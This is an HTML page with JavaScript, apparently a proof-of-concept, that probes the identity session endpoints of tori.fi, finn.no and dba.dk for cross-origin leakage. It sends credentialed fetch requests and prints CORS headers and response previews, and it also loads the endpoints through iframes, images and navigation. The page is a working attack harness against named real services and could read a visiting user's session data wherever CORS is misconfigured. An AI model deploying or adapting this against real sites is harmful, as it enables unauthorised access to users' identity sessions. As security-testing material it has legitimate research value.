<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Identity Session CORS Behavior Tester</title>

<style>
body {
    font-family: Arial;
    background: #f4f4f4;
    padding: 20px;
}

button {
    padding: 12px 18px;
    margin: 5px;
    font-size: 15px;
    background: #c62828;
    color: white;
    border: none;
    cursor: pointer;
}

pre {
    background: #111;
    color: #0f0;
    padding: 15px;
    max-height: 500px;
    overflow: auto;
}

iframe {
    width: 100%;
    height: 200px;
    margin-top: 10px;
}
</style>

</head>

<body>

<h1>🔐 Identity CORS Multi-Vector Tester</h1>

<p>
Controlled testing of session behavior without forced redirects.
</p>

<button onclick="runFetchTests()">
Run Fetch Tests
</button>

<button onclick="runIframeTests()">
Run Iframe Tests
</button>

<button onclick="runImageTests()">
Run Image Tests
</button>

<button onclick="runNavigationTest()">
Run Navigation Test
</button>

<pre id="output"></pre>

<div id="iframeContainer"></div>

<script>

/* ========================= */

const ENDPOINTS = [

"https://id.tori.fi/v2/session?client_sdrn=sdrn%3Aschibsted.fi%3Aclient%3A650421cf50eeae31ecd2a2d3",

"https://id.finn.no/v2/session",

"https://id.dba.dk/v2/session"

];

/* ========================= */

function log(msg) {

document.getElementById("output").textContent += msg + "\n";

}

/* ========================= */
/* FETCH TEST */
/* ========================= */

async function runFetchTests() {

log("\n=== FETCH TESTS ===\n");

for (const endpoint of ENDPOINTS) {

log("Testing:");
log(endpoint);

try {

const response =
await fetch(endpoint, {
method: "GET",
credentials: "include"
});

const text =
await response.text();

const corsOrigin =
response.headers.get(
"Access-Control-Allow-Origin"
);

const corsCreds =
response.headers.get(
"Access-Control-Allow-Credentials"
);

log(JSON.stringify({

endpoint: endpoint,
status: response.status,
cors_origin: corsOrigin,
cors_credentials: corsCreds,
preview: text.substring(0, 300)

}, null, 2));

}
catch (e) {

log("Fetch error: " + e.message);

}

}

}

/* ========================= */
/* IFRAME TEST */
/* ========================= */

function runIframeTests() {

log("\n=== IFRAME TESTS ===\n");

for (const endpoint of ENDPOINTS) {

const iframe =
document.createElement("iframe");

iframe.src = endpoint;

document
.getElementById("iframeContainer")
.appendChild(iframe);

}

}

/* ========================= */
/* IMAGE TEST */
/* ========================= */

function runImageTests() {

log("\n=== IMAGE TESTS ===\n");

for (const endpoint of ENDPOINTS) {

const img =
new Image();

img.src = endpoint;

}

}

/* ========================= */
/* NAVIGATION TEST */
/* ========================= */

function runNavigationTest() {

log("\n=== NAVIGATION TEST ===");

const target =
ENDPOINTS[0];

log("Navigating to:");
log(target);

window.location = target;

}

</script>

</body>
</html>
